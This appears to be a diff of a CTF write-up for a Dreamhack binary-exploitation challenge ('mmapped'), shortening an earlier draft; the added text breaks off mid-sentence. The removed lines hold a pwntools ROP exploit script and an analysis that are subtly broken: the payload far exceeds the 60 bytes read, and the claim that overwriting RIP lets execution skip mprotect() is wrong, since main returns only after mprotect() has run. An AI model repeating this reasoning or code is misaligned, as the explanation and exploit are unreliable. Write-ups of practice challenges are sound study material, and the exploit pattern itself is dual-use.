@@ -1,20 +1,17 @@
 ---
-title: "[Dreamhack] mmapped - Stack Overflow to Leak mmap'd Flag"
+title: "[Dreamhack] mmapped - Write up"
 date: 2024-01-17 00:00:00 +0700
 categories: [Dreamhack, Binary Exploitation]
 tags: [pwn, mmap, mprotect, stack-overflow, dreamhack, memory-protection]
 author: datious
-description: "Dreamhack writeup: mmapped — dùng stack buffer overflow để ghi đè save RIP trước khi mprotect() khóa vùng nhớ chứa flag thực."
 ---
 
-# [Write up for Dreamhack] Challenge: mmapped
-**Author: datious**
+[Write up for Dreamhack]__Challenge: **mmapped**      | Author: datious
 
-Today I will solve a challenge related to **memory protection**.
+Today I will solve a challenge that relate to memory protection. Below is the program.
 
-## Source Code
-
-```c
+chall.c
+```
 // Name: chall.c
 // Compile: gcc -fno-stack-protector chall.c -o chall
 
@@ -51,9 +48,9 @@ int main(int argc, char *argv[]) {
     printf("real flag address (mmapped address): %p\n", real_flag_addr);
 
     printf("%s", "input: ");
-    read(0, buf, 60);              // ← buf is 0x20=32 bytes, reads 60 → Overflow!
+    read(0, buf, 60);
 
-    mprotect(real_flag_addr, len, PROT_NONE);   // ← removes read permission!
+    mprotect(real_flag_addr, len, PROT_NONE);
 
     write(1, fake_flag_addr, FLAG_SIZE);
     printf("\nbuf value: ");
@@ -61,76 +58,14 @@ int main(int argc, char *argv[]) {
 
     munmap(real_flag_addr, FLAG_SIZE);
     close(fd);
+
     return 0;
 }
 ```
 
-## Analysis
+So we can see that the program provides with three addresses involved: fake_flag_addr, real_flag_addr and buf.
 
-The program provides 3 addresses:
-- `fake_flag_addr` (read-only, .rodata): fake flag string
-- `buf` (stack): user input buffer
-- `real_flag_addr` (mmap'd): actual flag content
+In the main function we can see that when contents of the flag was read and contained in real_flag_addr. This is the target we need to use to print flag out of the screen.
 
-**The flow:**
-1. `mmap()` maps the flag file into memory with `PROT_READ`
-2. User input via `read(0, buf, 60)` — **buffer overflow** (buf = 32 bytes)
-3. `mprotect(real_flag_addr, len, PROT_NONE)` — **removes read permission from flag!**
-4. Writes `fake_flag_addr` to stdout (the fake flag)
-
-**Vulnerability:** `read(0, buf, 60)` into a 32-byte `buf` → **stack-based buffer overflow**.
-
-## Strategy
-
-We need to read the flag **before** `mprotect()` removes access. But control flow goes straight to `mprotect()` after input.
-
-**Key insight:** With the overflow, we can overwrite **save RIP** and redirect execution before or instead of `mprotect()`.
-
-We want to print `real_flag_addr`. But since we know it (the program prints it), we can craft a ROP chain:
-
-```
-write(1, real_flag_addr, FLAG_SIZE)
-```
-
-Instead of calling `mprotect()`, we skip to our write call.
-
-```python
-from pwn import *
-
-p = process('./chall')
-# or: p = remote(...)
-
-# Parse leaked addresses
-p.recvuntil("fake flag address: ")
-fake_addr = int(p.recvline().strip(), 16)
-
-p.recvuntil("buf address: ")
-buf_addr = int(p.recvline().strip(), 16)
-
-p.recvuntil("real flag address (mmapped address): ")
-real_addr = int(p.recvline().strip(), 16)
-
-log.info(f"fake  = {hex(fake_addr)}")
-log.info(f"buf   = {hex(buf_addr)}")
-log.info(f"real  = {hex(real_addr)}")
-
-elf = ELF('./chall')
-
-# ROP gadgets (no PIE so fixed addresses)
-pop_rdi = ...   # find with: ROPgadget --binary chall | grep "pop rdi"
-pop_rsi = ...   # pop rsi; pop r15; ret  or similar
-pop_rdx = ...   # pop rdx; ret
-
-# write(1, real_addr, 0x45)
-payload  = b'A' * 40     # 32 (buf) + 8 (saved rbp) = 40 offset to RIP
-payload += p64(pop_rdi) + p64(1)
-payload += p64(pop_rsi) + p64(real_addr) + p64(0)
-payload += p64(pop_rdx) + p64(0x45)
-payload += p64(elf.plt['write'])
-
-p.sendafter("input: ", payload)
-flag = p.recv(0x45)
-log.success(f"Flag: {flag}")
-```
-
-> **Lesson:** `mprotect()` is often used as a defense, but if you can control the RIP **before** it's called, you can bypass it entirely.
+**Vulnerability**
+The vulnerability is a stack-based buffer overflow in th
